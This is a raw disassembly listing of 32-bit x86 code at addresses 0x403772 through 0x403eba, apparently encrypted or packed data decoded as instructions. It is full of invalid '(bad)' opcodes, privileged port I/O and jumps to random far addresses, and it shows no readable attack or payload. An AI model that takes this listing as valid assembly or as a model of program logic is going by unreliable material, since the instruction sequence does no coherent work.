  403772:	xchg   esi,eax
  403773:	das    
  403774:	jecxz  0x403791
  403776:	inc    eax
  403777:	pop    ds
  403778:	or     ecx,DWORD PTR [edx]
  40377a:	ja     0x403702
  40377c:	pop    es
  40377d:	jb     0x403739
  40377f:	adc    al,0xe0
  403781:	(bad)  
  403782:	into   
  403783:	cmc    
  403784:	or     ah,BYTE PTR [esi+0x4e]
  403787:	cdq    
  403788:	out    dx,al
  403789:	leave  
  40378a:	sbb    DWORD PTR [ecx-0x70],esi
  40378d:	mov    eax,0xb21c81b2
  403792:	fucomp st(1)
  403794:	lahf   
  403795:	in     al,0xed
  403797:	fsub   DWORD PTR [ecx-0x25]
  40379a:	sub    bl,BYTE PTR [esi-0x401eba72]
  4037a0:	scas   eax,DWORD PTR es:[edi]
  4037a1:	leave  
  4037a2:	dec    ebp
  4037a3:	cli    
  4037a4:	cdq    
  4037a5:	push   ds
  4037a6:	mov    DWORD PTR [edi-0x433c1b92],edx
  4037ac:	fcmovu st,st(1)
  4037ae:	jp     0x40376d
  4037b0:	lahf   
  4037b1:	mov    ds:0x893f7fec,al
  4037b6:	ret    
  4037b7:	popa   
  4037b8:	push   ebx
  4037b9:	call   0xe638:0x95a843af
  4037c0:	adc    eax,0xacf193bd
  4037c5:	cs lahf 
  4037c7:	mov    eax,ds:0xd6319605
  4037cc:	nop
  4037cd:	lds    edx,FWORD PTR ds:0x33b816be
  4037d3:	sub    DWORD PTR [edx+0x7e],ecx
  4037d6:	lds    edi,FWORD PTR [esi+esi*8+0x45]
  4037da:	push   edi
  4037db:	pop    esp
  4037dc:	clc    
  4037dd:	out    dx,eax
  4037de:	sub    DWORD PTR [ebp+0x9b1031c],ebx
  4037e4:	add    al,0xa7
  4037e6:	xchg   DWORD PTR [ebx],edi
  4037e8:	loopne 0x4037ed
  4037ea:	imul   edx,DWORD PTR [ecx+0x55],0x963612cf
  4037f1:	mov    al,ds:0x61925b58
  4037f6:	sbb    ch,bh
  4037f8:	inc    ebp
  4037f9:	call   0xf0b9d456
  4037fe:	cmp    DWORD PTR [ebx+edx*1],0x6a
  403802:	in     al,dx
  403803:	sti    
  403804:	(bad)  [ebx+ebp*2]
  403807:	leave  
  403808:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403809:	xchg   ecx,eax
  40380a:	int    0x2e
  40380c:	js     0x403849
  40380e:	mov    edi,0x7c1a77be
  403813:	dec    ebx
  403814:	or     ah,BYTE PTR [edx]
  403816:	cmp    ch,BYTE PTR [edx]
  403818:	pop    edx
  403819:	call   DWORD PTR [ebx]
  40381b:	rcr    BYTE PTR [ecx],1
  40381d:	or     BYTE PTR [esi-0x26bda10b],0x8f
  403824:	cld    
  403825:	inc    eax
  403826:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403827:	icebp  
  403828:	xlat   BYTE PTR ds:[ebx]
  403829:	arpl   WORD PTR [ebx+0x6cb37b60],bx
  40382f:	dec    esi
  403830:	fdiv   st(5),st
  403832:	pop    ecx
  403833:	mov    ebp,0x90b36584
  403838:	test   DWORD PTR [ebp+0x1a],edi
  40383b:	sub    eax,0xc52237d0
  403840:	fs ja  0x403879
  403843:	xor    esi,edx
  403845:	mov    esp,0xdb805cb2
  40384a:	sahf   
  40384b:	clc    
  40384c:	into   
  40384d:	stos   BYTE PTR es:[edi],al
  40384e:	jge    0x403862
  403850:	std    
  403851:	push   ss
  403852:	mov    ds:0x2c2be065,eax
  403857:	xchg   esp,eax
  403858:	add    ecx,DWORD PTR [eax]
  40385a:	xor    eax,0xd7db35aa
  40385f:	sub    DWORD PTR [ecx+0x2f],edx
  403862:	mov    esp,0x23e263a0
  403867:	loope  0x403840
  403869:	pusha  
  40386a:	pop    es
  40386b:	adc    al,0xe4
  40386d:	pop    ebx
  40386e:	int    0xe1
  403870:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403871:	lods   eax,DWORD PTR ds:[esi]
  403872:	pusha  
  403873:	push   0xffffff9c
  403875:	cs mov edi,ds
  403878:	xchg   ebx,eax
  403879:	jle    0x40380b
  40387b:	sub    BYTE PTR [ebx-0x543ae93e],ch
  403881:	pop    ss
  403882:	pop    ecx
  403883:	sbb    al,0x5b
  403885:	xor    DWORD PTR [ecx-0x67d7a23f],ebp
  40388b:	xor    ah,ah
  40388d:	lods   al,BYTE PTR ds:[esi]
  40388e:	mov    ecx,0x31d1e6b4
  403893:	dec    ebp
  403894:	cmc    
  403895:	mov    al,0xfa
  403897:	jnp    0x4038f9
  403899:	dec    edi
  40389a:	xor    ch,cl
  40389c:	pop    ss
  40389d:	popf   
  40389e:	inc    edi
  40389f:	or     al,0xbd
  4038a1:	nop
  4038a2:	or     BYTE PTR [ecx+0x52],bl
  4038a5:	clc    
  4038a6:	das    
  4038a7:	xchg   edx,eax
  4038a8:	dec    esi
  4038a9:	lahf   
  4038aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4038ab:	gs jp  0x403874
  4038ae:	test   al,0x35
  4038b0:	inc    ebp
  4038b1:	mov    WORD PTR [eax+0x4d],fs
  4038b4:	outs   dx,DWORD PTR ds:[esi]
  4038b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4038b6:	xchg   ebx,eax
  4038b7:	clc    
  4038b8:	and    eax,0x5a568af8
  4038bd:	ss mov dh,0x94
  4038c0:	pop    esi
  4038c1:	dec    edx
  4038c2:	mov    dh,0x3a
  4038c4:	and    ebx,DWORD PTR [esi+0xa]
  4038c7:	aas    
  4038c8:	mov    ah,0x36
  4038ca:	sbb    BYTE PTR [edx-0x416075fc],ch
  4038d0:	out    0xfe,eax
  4038d2:	mov    ?,WORD PTR [edi]
  4038d4:	xor    al,0x60
  4038d6:	jg     0x403925
  4038d8:	ds pop esp
  4038da:	sbb    edi,esp
  4038dc:	les    ebp,FWORD PTR [ebp-0x2eaa67e6]
  4038e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4038e3:	fcmovnbe st,st(5)
  4038e5:	inc    eax
  4038e6:	xchg   ecx,eax
  4038e7:	push   edi
  4038e8:	sar    BYTE PTR [ebp+ebp*4-0x48edf01a],1
  4038ef:	mov    ebp,0x48a0128
  4038f4:	or     cl,BYTE PTR [ecx-0x20]
  4038f7:	push   esp
  4038f8:	mov    ds,WORD PTR [eax-0x22f7c2d5]
  4038fe:	sbb    al,0xf3
  403900:	bound  ebx,QWORD PTR [esi+0xd]
  403903:	mov    bh,0x2f
  403905:	sbb    eax,0xd403c47d
  40390a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40390b:	and    eax,0xe93bc6dc
  403910:	jp     0x4038c8
  403912:	cmp    eax,0xf6f0730d
  403917:	cmp    BYTE PTR [edi],dh
  403919:	aam    0xdc
  40391b:	out    dx,al
  40391c:	into   
  40391d:	nop
  40391e:	pop    esp
  40391f:	retf   0x9e94
  403922:	and    al,0xad
  403924:	jns    0x4038e7
  403926:	fadd   QWORD PTR [ecx-0x37]
  403929:	imul   edi,eax,0x1
  40392c:	mov    ds:0x11bf4dde,eax
  403931:	dec    esp
  403932:	dec    eax
  403933:	xor    BYTE PTR [eax+eax*2],bl
  403936:	xor    esi,DWORD PTR [esi-0x53cabb73]
  40393c:	mov    eax,0x34a32582
  403941:	push   ebx
  403942:	sub    dh,BYTE PTR [ebx]
  403944:	das    
  403945:	lock repnz push ebx
  403948:	push   0xffffffed
  40394a:	and    al,0xc4
  40394c:	push   ebx
  40394d:	out    dx,al
  40394e:	ja     0x4039ad
  403950:	dec    ebp
  403951:	and    eax,0x72b25312
  403956:	dec    esp
  403957:	dec    edi
  403958:	out    dx,eax
  403959:	jns    0x403954
  40395b:	jmp    0x11b3049d
  403960:	mov    WORD PTR [ecx+edi*4-0x3842ef2f],ds
  403967:	mov    eax,0xbf6f63f4
  40396c:	mov    dl,0xde
  40396e:	outs   dx,BYTE PTR ds:[esi]
  40396f:	sub    eax,0x20e0629f
  403974:	rcr    DWORD PTR [ebx+0x431d8f54],1
  40397a:	retf   0x5ad9
  40397d:	cdq    
  40397e:	push   0xffffff94
  403980:	loopne 0x4039da
  403982:	pop    ecx
  403983:	rol    edx,cl
  403985:	retf   0x2283
  403988:	outs   dx,BYTE PTR ds:[esi]
  403989:	(bad)
  40398c:	(bad)  
  40398d:	aaa    
  40398e:	dec    eax
  40398f:	push   0xfffffff7
  403991:	sub    al,0x28
  403993:	mov    ecx,0x4f1efaf
  403998:	cmp    BYTE PTR [ebx+edx*4],bh
  40399b:	mov    ah,BYTE PTR [esi+0x29]
  40399e:	mov    bl,0xcd
  4039a0:	test   al,0x98
  4039a2:	ds das 
  4039a4:	xor    dh,al
  4039a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4039a7:	(bad)  
  4039a9:	(bad)  
  4039aa:	clc    
  4039ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4039ac:	mov    DWORD PTR [ecx-0x654ebc76],0x524770d0
  4039b6:	cmp    DWORD PTR [edi+eiz*4-0xa],0x744122f0
  4039be:	ins    DWORD PTR es:[edi],dx
  4039bf:	repnz sub dl,BYTE PTR [ecx+ebp*8+0x5e]
  4039c4:	add    al,0xf
  4039c6:	push   0xffffffbc
  4039c8:	mov    dl,0xf3
  4039ca:	add    al,cl
  4039cc:	fdiv   DWORD PTR [edi+0x775aaf98]
  4039d2:	test   DWORD PTR ds:0xeeddb66f,ecx
  4039d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4039d9:	lods   eax,DWORD PTR ds:[esi]
  4039da:	xor    ecx,DWORD PTR [edi+0x7b5c9774]
  4039e0:	dec    ecx
  4039e1:	pop    ds
  4039e2:	nop
  4039e3:	ror    BYTE PTR [ecx],0xcb
  4039e6:	adc    BYTE PTR [esi-0x1ab15f79],al
  4039ec:	mov    edx,0x5b6bdce4
  4039f1:	dec    ecx
  4039f2:	mov    ebx,0xec4e3846
  4039f7:	fnstsw WORD PTR gs:[ebx+0x57]
  4039fb:	cld    
  4039fc:	add    dh,ch
  4039fe:	push   ebx
  4039ff:	mov    dh,0xa6
  403a01:	adc    cl,al
  403a03:	xor    BYTE PTR [eax-0x34],bh
  403a06:	mov    edx,0xf6f963c6
  403a0b:	xlat   BYTE PTR ds:[ebx]
  403a0c:	in     al,0x36
  403a0e:	fdivr  DWORD PTR [edx]
  403a10:	push   edi
  403a11:	stos   DWORD PTR es:[edi],eax
  403a12:	mov    dl,dh
  403a14:	jns    0x4039cc
  403a16:	arpl   WORD PTR [esi+ecx*1],sp
  403a19:	daa    
  403a1a:	mul    DWORD PTR [eax+edi*2+0x4a]
  403a1e:	inc    edi
  403a1f:	add    al,0x29
  403a21:	cmp    BYTE PTR [edx+0x32bf5c9a],0x4f
  403a28:	push   ebx
  403a29:	cmp    WORD PTR [esi],0x39
  403a2d:	jl     0x403a88
  403a2f:	dec    ecx
  403a30:	out    0x47,eax
  403a32:	adc    ebp,0x1bc05f82
  403a38:	mov    dh,0xab
  403a3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a3b:	and    ah,BYTE PTR [ecx-0x2]
  403a3e:	add    al,bh
  403a40:	cmp    ch,BYTE PTR [ebx-0x3ab16833]
  403a46:	jl     0x403a65
  403a48:	cmp    eax,0xcd9a70b3
  403a4d:	retf   
  403a4e:	jnp    0x403ac7
  403a50:	sahf   
  403a51:	push   ecx
  403a52:	xchg   BYTE PTR [ecx],dl
  403a54:	jnp    0x403a3a
  403a56:	add    edx,ebp
  403a58:	xchg   esp,eax
  403a59:	or     DWORD PTR [esi-0x1d2438b2],ebp
  403a5f:	hlt    
  403a60:	mov    ecx,0xd8aab82c
  403a65:	stos   BYTE PTR es:[edi],al
  403a66:	mov    bl,0x7d
  403a68:	pop    esp
  403a69:	es add eax,0xc84d8c75
  403a6f:	loope  0x403ac0
  403a71:	leave  
  403a72:	es hlt 
  403a74:	out    dx,al
  403a75:	inc    esi
  403a76:	rcr    DWORD PTR [eax+0xb034192],cl
  403a7c:	iret   
  403a7d:	popa   
  403a7e:	scas   eax,DWORD PTR es:[edi]
  403a7f:	push   eax
  403a80:	inc    eax
  403a81:	mov    al,ds:0xccd07656
  403a86:	nop
  403a87:	stos   BYTE PTR es:[edi],al
  403a88:	or     eax,DWORD PTR [ecx-0x1f435094]
  403a8e:	call   0x7d83:0xad5c580c
  403a95:	pop    ds
  403a96:	pop    esi
  403a97:	pushf  
  403a98:	shl    DWORD PTR [esi+ebx*4],cl
  403a9b:	aaa    
  403a9c:	mov    eax,ds:0xb79e290e
  403aa1:	sar    BYTE PTR [edi],cl
  403aa3:	(bad)  
  403aa4:	(bad)  
  403aa5:	sbb    BYTE PTR [ebp-0x66],ch
  403aa8:	mov    edi,0x28e43a09
  403aad:	push   ebp
  403aae:	pop    ebx
  403aaf:	xchg   BYTE PTR [edx],bl
  403ab1:	xchg   ebx,eax
  403ab2:	aam    0x7a
  403ab4:	std    
  403ab5:	stos   BYTE PTR es:[edi],al
  403ab6:	xchg   ecx,eax
  403ab7:	pop    esi
  403ab8:	mov    al,cl
  403aba:	jo     0x403b09
  403abc:	dec    DWORD PTR [ebp-0x75]
  403abf:	stos   DWORD PTR es:[edi],eax
  403ac0:	adc    al,0xfd
  403ac2:	push   ds
  403ac3:	popa   
  403ac4:	cmp    eax,0xe6956e52
  403ac9:	in     al,dx
  403aca:	mov    bh,0x36
  403acc:	mov    eax,ds:0xa81d14d2
  403ad1:	ficom  DWORD PTR [esi]
  403ad3:	mov    bl,0x2c
  403ad5:	or     esp,esp
  403ad7:	cmp    BYTE PTR [esi+edi*1+0x21],bl
  403adb:	les    ebx,FWORD PTR [edx+esi*8]
  403ade:	ins    DWORD PTR es:[edi],dx
  403adf:	repz pop esp
  403ae1:	mov    dh,0x6f
  403ae3:	or     cl,BYTE PTR [esi+ecx*8-0xb]
  403ae7:	sbb    ah,bl
  403ae9:	push   ds
  403aea:	ins    DWORD PTR es:[edi],dx
  403aeb:	dec    eax
  403aec:	cmp    cl,BYTE PTR [edi-0x47]
  403aef:	in     eax,0x69
  403af1:	(bad)  
  403af2:	mov    ds:0x3e30eed6,al
  403af7:	mov    ah,0xc5
  403af9:	popa   
  403afa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403afb:	mov    dl,0x94
  403afd:	lea    esi,[edx-0x2c]
  403b00:	mov    eax,ds:0x602c94e0
  403b05:	push   esp
  403b06:	xchg   ecx,eax
  403b07:	das    
  403b08:	adc    esi,DWORD PTR [edx+0x54a1deeb]
  403b0e:	pop    ebp
  403b0f:	repnz lods al,BYTE PTR ds:[esi]
  403b11:	adc    edx,ebp
  403b13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b14:	fs add al,0x5d
  403b17:	es ret 
  403b19:	jle    0x403b8e
  403b1b:	out    0x49,eax
  403b1d:	jmp    0xbee31b92
  403b22:	sbb    DWORD PTR [ebp+0x6c],edx
  403b25:	mov    DWORD PTR gs:[edx-0x45],edi
  403b29:	push   0xffffffec
  403b2b:	ror    BYTE PTR [eax-0x11ff43fa],cl
  403b31:	jno    0x403ad8
  403b33:	das    
  403b34:	ret    0xd515
  403b37:	in     eax,0x9a
  403b39:	xor    eax,0xee0bab1b
  403b3e:	popf   
  403b3f:	or     BYTE PTR [ecx+ebx*8],bl
  403b42:	mov    eax,DWORD PTR [esi]
  403b44:	popf   
  403b45:	fstp   TBYTE PTR [eax+edx*1+0x143e6f2d]
  403b4c:	out    0xf0,eax
  403b4e:	gs stos DWORD PTR es:[edi],eax
  403b50:	cdq    
  403b51:	into   
  403b52:	loop   0x403ba9
  403b54:	ins    DWORD PTR es:[edi],dx
  403b55:	js     0x403bd0
  403b57:	lds    ebp,FWORD PTR [ebx]
  403b59:	(bad)  
  403b5a:	test   eax,0x5d957136
  403b5f:	push   ebp
  403b60:	std    
  403b61:	addr16 sti 
  403b63:	xchg   BYTE PTR [edi],dl
  403b65:	pop    es
  403b66:	popf   
  403b67:	imul   edx,DWORD PTR [esi+0x484146d2],0xffffffc1
  403b6e:	push   ds
  403b6f:	stc    
  403b70:	mov    al,ah
  403b72:	jnp    0x403bdc
  403b74:	adc    al,0xbb
  403b76:	popf   
  403b77:	inc    esp
  403b78:	push   edi
  403b79:	aaa    
  403b7a:	pop    ecx
  403b7b:	add    bh,BYTE PTR [ebp-0x58f94396]
  403b81:	jno    0x403c00
  403b83:	mov    WORD PTR [eax],es
  403b85:	pusha  
  403b86:	jb     0x403bac
  403b88:	shl    DWORD PTR [edx],cl
  403b8a:	sbb    al,0x94
  403b8c:	rcr    DWORD PTR [edi-0x67e4fe82],0xac
  403b93:	push   es
  403b94:	int3   
  403b95:	dec    ebx
  403b96:	outs   dx,DWORD PTR ds:[esi]
  403b97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b98:	inc    edi
  403b99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b9b:	fdivr  st(0),st
  403b9d:	mov    BYTE PTR [eax-0x41],cl
  403ba0:	ins    DWORD PTR es:[edi],dx
  403ba1:	aas    
  403ba2:	imul   ebp,eax,0x96d99a32
  403ba8:	test   BYTE PTR ds:0x308f4876,ah
  403bae:	jnp    0x403b6a
  403bb0:	test   BYTE PTR [ecx+0x1b775f26],bl
  403bb6:	mov    ds:0x735445de,al
  403bbb:	xor    eax,0x8ae3ee
  403bc0:	in     al,0x7e
  403bc2:	add    eax,0xebc9a0f9
  403bc7:	std    
  403bc8:	sub    cl,BYTE PTR [ebx-0x6a0201d1]
  403bce:	inc    eax
  403bcf:	xchg   edx,eax
  403bd0:	jmp    0x4a869619
  403bd5:	adc    DWORD PTR ds:0xae21b29b,ebp
  403bdb:	test   al,0xb7
  403bdd:	fwait
  403bde:	cmp    edx,DWORD PTR [ebp+eax*2-0x95e4d3]
  403be5:	add    al,0x10
  403be7:	push   es
  403be8:	cld    
  403be9:	add    eax,DWORD PTR [edx-0x4305fc81]
  403bef:	sub    DWORD PTR [eax],0x2ecdaaae
  403bf5:	lds    eax,FWORD PTR [edx+0x72]
  403bf8:	sbb    al,0x18
  403bfa:	in     al,0x55
  403bfc:	inc    esi
  403bfd:	jns    0x403c10
  403bff:	out    0xf9,al
  403c01:	stc    
  403c02:	pop    ss
  403c03:	pop    edi
  403c04:	and    bh,BYTE PTR [eax]
  403c06:	popa   
  403c07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c08:	sbb    BYTE PTR [edx],bh
  403c0a:	retf   0x9be3
  403c0d:	sahf   
  403c0e:	pop    ebp
  403c0f:	push   ecx
  403c10:	jbe    0x403bb4
  403c12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c13:	push   eax
  403c14:	push   es
  403c15:	mov    dl,0xa6
  403c17:	and    cl,BYTE PTR [esi+0x71]
  403c1a:	in     al,dx
  403c1b:	ja     0x403c38
  403c1d:	push   es
  403c1e:	call   0xc760:0x77db4ac2
  403c25:	mov    bh,0x1d
  403c27:	push   es
  403c28:	mov    al,ds:0x32082934
  403c2d:	call   0x857ca820
  403c32:	lock and bl,0x5e
  403c36:	pop    DWORD PTR [edi-0xc1994bf]
  403c3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c3d:	xor    BYTE PTR [ecx],bh
  403c3f:	dec    esp
  403c40:	push   0xffffff91
  403c42:	test   eax,0xa6112aee
  403c47:	(bad)  
  403c48:	xchg   ebx,eax
  403c49:	jecxz  0x403cb1
  403c4b:	mov    DWORD PTR [esi-0xb],ebp
  403c4e:	pop    eax
  403c4f:	push   cs
  403c50:	sbb    bh,BYTE PTR [esi-0x1a]
  403c53:	mov    bh,0xa9
  403c55:	ins    DWORD PTR es:[edi],dx
  403c56:	push   cs
  403c57:	dec    esp
  403c58:	pop    ecx
  403c59:	in     al,0xca
  403c5b:	fwait
  403c5c:	push   edi
  403c5d:	inc    edx
  403c5e:	clc    
  403c5f:	fcom   DWORD PTR [esp+esi*2]
  403c62:	ins    DWORD PTR es:[edi],dx
  403c63:	ret    0x5686
  403c66:	mov    eax,0x21127afb
  403c6b:	jbe    0x403c2d
  403c6d:	lahf   
  403c6e:	nop
  403c6f:	or     bh,cl
  403c71:	adc    BYTE PTR [edx+0x42],0x54
  403c75:	aas    
  403c76:	arpl   WORD PTR [esi-0x51],si
  403c79:	lods   al,BYTE PTR ds:[esi]
  403c7a:	retf   0xa887
  403c7d:	pop    es
  403c7e:	inc    edx
  403c7f:	jne    0x403c60
  403c81:	sbb    eax,0xe9847a54
  403c86:	xchg   ebx,eax
  403c87:	addr16 jbe 0x403c0b
  403c8a:	xor    ah,BYTE PTR [ebx]
  403c8c:	cmp    eax,ebp
  403c8e:	popf   
  403c8f:	test   BYTE PTR fs:[ebx-0x6806d618],0xed
  403c97:	leavew 
  403c99:	jp     0x403c58
  403c9b:	aaa    
  403c9c:	mov    eax,0x584950a7
  403ca1:	and    edi,DWORD PTR [edx]
  403ca3:	add    ebx,DWORD PTR [ecx-0x29385839]
  403ca9:	jg     0x403d0d
  403cab:	in     eax,dx
  403cac:	es mov ecx,esp
  403caf:	adc    eax,0xece7f500
  403cb4:	mov    dh,0xd
  403cb6:	sbb    eax,0xec315bfe
  403cbb:	mov    eax,0x12ae8661
  403cc0:	fnstsw WORD PTR [edx]
  403cc2:	dec    ebp
  403cc3:	add    BYTE PTR [edx+0x28],0xd5
  403cc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403cc8:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403cca:	jbe    0x403cad
  403ccc:	inc    edi
  403ccd:	test   edi,edi
  403ccf:	enter  0x48e7,0xd0
  403cd3:	push   edi
  403cd4:	add    cl,bl
  403cd6:	jo     0x403d0c
  403cd8:	push   0x4046bd3b
  403cdd:	push   esi
  403cde:	inc    esp
  403cdf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ce0:	inc    esi
  403ce1:	mov    ch,0x10
  403ce3:	std    
  403ce4:	bound  esi,QWORD PTR [esi]
  403ce6:	inc    eax
  403ce7:	mov    ch,0x92
  403ce9:	push   esi
  403cea:	sub    eax,0x2649639c
  403cef:	dec    edi
  403cf0:	and    ch,BYTE PTR [ecx+0x7f]
  403cf3:	(bad)  
  403cf4:	sbb    eax,DWORD PTR [ecx]
  403cf6:	scas   al,BYTE PTR es:[edi]
  403cf7:	push   cs
  403cf8:	sub    dh,BYTE PTR [esi]
  403cfa:	mov    ebp,esp
  403cfc:	cs inc esi
  403cfe:	and    al,0xc1
  403d00:	dec    eax
  403d01:	inc    eax
  403d02:	dec    sp
  403d04:	and    al,0x5
  403d06:	fld    QWORD PTR [ecx+0x12]
  403d09:	je     0x403d77
  403d0b:	loope  0x403d14
  403d0d:	jb     0x403d3b
  403d0f:	or     al,0xf5
  403d11:	inc    edx
  403d12:	retf   
  403d13:	pop    eax
  403d14:	ins    BYTE PTR es:[edi],dx
  403d15:	sub    ebx,DWORD PTR [edx-0x4]
  403d18:	push   esi
  403d19:	inc    ebx
  403d1a:	dec    ecx
  403d1b:	in     al,0x88
  403d1d:	xchg   ebp,eax
  403d1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d1f:	mov    ds:0xbc26b6c1,eax
  403d24:	mov    ds:0xdf461c80,eax
  403d29:	sbb    ecx,DWORD PTR [ebx]
  403d2b:	dec    ebx
  403d2c:	sbb    BYTE PTR [ebx+0x6f93820c],ch
  403d32:	aas    
  403d33:	into   
  403d34:	test   al,0xc1
  403d36:	jl     0x403d45
  403d38:	aaa    
  403d39:	ins    BYTE PTR es:[edi],dx
  403d3a:	jl     0x403dac
  403d3c:	retf   
  403d3d:	push   edi
  403d3e:	call   0xab0c:0x6ed59488
  403d45:	rol    esi,1
  403d47:	jb     0x403d42
  403d49:	dec    BYTE PTR [edx]
  403d4b:	out    dx,eax
  403d4c:	leave  
  403d4d:	popa   
  403d4e:	dec    ecx
  403d4f:	leave  
  403d50:	imul   esp,DWORD PTR [eax],0x2b
  403d53:	push   ebx
  403d54:	jmp    0x403dcb
  403d56:	out    0x6a,eax
  403d58:	and    al,0xb4
  403d5a:	sub    eax,0x63ccb03c
  403d5f:	mov    ebx,ebp
  403d61:	or     cl,al
  403d63:	xchg   ecx,eax
  403d64:	cmp    eax,0xddee216f
  403d69:	popa   
  403d6a:	dec    esp
  403d6b:	jmp    0x403d35
  403d6d:	jae    0x403cf6
  403d6f:	bound  esi,QWORD PTR [edi-0x1c64a74a]
  403d75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d76:	xchg   ebx,eax
  403d77:	mov    BYTE PTR [ebp-0x39],bh
  403d7a:	sbb    eax,0x5868d6a9
  403d7f:	loop   0x403dff
  403d81:	add    DWORD PTR [edx+0x475d7a1b],ebx
  403d87:	mov    ?,WORD PTR ds:0xe8fea5f4
  403d8d:	adc    eax,0xf784b370
  403d92:	test   al,0x1
  403d94:	cmp    DWORD PTR [eax-0x49],edi
  403d97:	fwait
  403d98:	mov    eax,ds:0x7aaa576e
  403d9d:	data16 arpl WORD PTR fs:[ebp+0x5],sp
  403da2:	jo     0x403d63
  403da4:	jmp    0x403de5
  403da6:	inc    esp
  403da7:	mov    eax,ds:0x6fce06b4
  403dac:	imul   ebx,DWORD PTR [esi],0xffffffa8
  403daf:	jge    0x403d3f
  403db1:	(bad)  
  403db2:	popf   
  403db3:	mov    ebp,0xbaf16c8c
  403db8:	inc    esp
  403db9:	ins    BYTE PTR es:[edi],dx
  403dba:	jo     0x403de5
  403dbc:	pop    edi
  403dbd:	add    esi,esi
  403dbf:	or     eax,0xcefc0236
  403dc4:	daa    
  403dc5:	jmp    0x1160:0x3a549f2
  403dcc:	test   DWORD PTR [esi],ecx
  403dce:	aas    
  403dcf:	pop    edi
  403dd0:	(bad)  
  403dd1:	mov    eax,0x608114f2
  403dd6:	arpl   cx,ax
  403dd8:	retf   0xc1aa
  403ddb:	stos   BYTE PTR es:[edi],al
  403ddc:	mov    WORD PTR [ecx],cs
  403dde:	nop
  403ddf:	mov    ds:0x66c91646,al
  403de4:	and    al,BYTE PTR cs:[eax+ebp*8]
  403de8:	pop    edi
  403de9:	mov    gs,WORD PTR [ebx-0x190f829]
  403def:	mov    ebx,0xddf5a3bc
  403df4:	std    
  403df5:	pushf  
  403df6:	imul   esp,DWORD PTR [eax],0xffffff85
  403df9:	push   ecx
  403dfa:	pop    eax
  403dfb:	test   eax,0x8afb153b
  403e00:	fwait
  403e01:	adc    eax,0xe1a42d5c
  403e06:	mov    esi,0x2c1c9697
  403e0b:	adc    BYTE PTR [edi+eiz*2+0x4c],bl
  403e0f:	sbb    BYTE PTR [ecx+0x7d],0xe8
  403e13:	sub    esp,DWORD PTR [ebx]
  403e15:	ret    
  403e16:	mov    eax,ds:0x53499312
  403e1b:	mov    BYTE PTR [esi+0x27368c46],0x19
  403e22:	add    ecx,DWORD PTR [edi+0x7e]
  403e25:	jmp    0x3da5:0xc208368d
  403e2c:	push   ebx
  403e2d:	mov    cl,0x74
  403e2f:	daa    
  403e30:	ins    DWORD PTR es:[edi],dx
  403e31:	jae    0x403e18
  403e33:	jge    0x403e92
  403e35:	stos   BYTE PTR es:[edi],al
  403e36:	mov    dh,0x9c
  403e38:	inc    eax
  403e39:	cmp    al,0xb2
  403e3b:	mov    dh,bh
  403e3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e3e:	int    0x4
  403e40:	ret    
  403e41:	icebp  
  403e42:	sbb    bh,cl
  403e44:	or     al,0x43
  403e46:	dec    ebp
  403e47:	int    0xc1
  403e49:	sub    eax,0x271b6a90
  403e4e:	pop    ebx
  403e4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e50:	dec    esi
  403e51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e52:	js     0x403eb9
  403e54:	xor    bh,BYTE PTR [ecx-0x41]
  403e57:	popa   
  403e58:	cmp    ah,bl
  403e5a:	jnp    0x403e0e
  403e5c:	ds sbb al,0x2c
  403e5f:	mov    esp,0x79f378d6
  403e64:	pop    ebx
  403e65:	lds    ebp,FWORD PTR [eax+ecx*8]
  403e68:	mov    WORD PTR [edi],ss
  403e6a:	icebp  
  403e6b:	test   eax,0x7c1237f8
  403e70:	sbb    al,0xc5
  403e72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e73:	xor    al,0x5d
  403e75:	dec    esi
  403e76:	push   ss
  403e77:	adc    al,0x6b
  403e79:	add    BYTE PTR [ebp-0x62],bh
  403e7c:	and    eax,0xdf6e3040
  403e81:	mov    cl,0xa9
  403e83:	in     al,0xd6
  403e85:	loop   0x403ed3
  403e87:	es pop ebx
  403e89:	xor    BYTE PTR [eax+0x58280296],al
  403e8f:	mov    dh,BYTE PTR [edx+0x56]
  403e92:	adc    BYTE PTR [bx+si+0x43],bh
  403e96:	xchg   ebp,eax
  403e97:	stos   DWORD PTR es:[edi],eax
  403e98:	or     edi,esp
  403e9a:	icebp  
  403e9b:	ror    DWORD PTR [ecx+edi*4-0x1e],0xce
  403ea0:	push   ebx
  403ea1:	push   0xb8f7f7d6
  403ea6:	push   edi
  403ea7:	(bad)  
  403ea8:	lds    edi,FWORD PTR [edx-0x49]
  403eab:	xlat   BYTE PTR ds:[ebx]
  403eac:	xchg   edx,eax
  403ead:	sbb    bl,BYTE PTR [ebx]
  403eaf:	fcompp 
  403eb1:	js     0x403e4a
  403eb3:	lock sbb eax,0x7c4b5dfc
  403eb9:	retf   
  403eba:	mov    ecx,0x6fd67b28
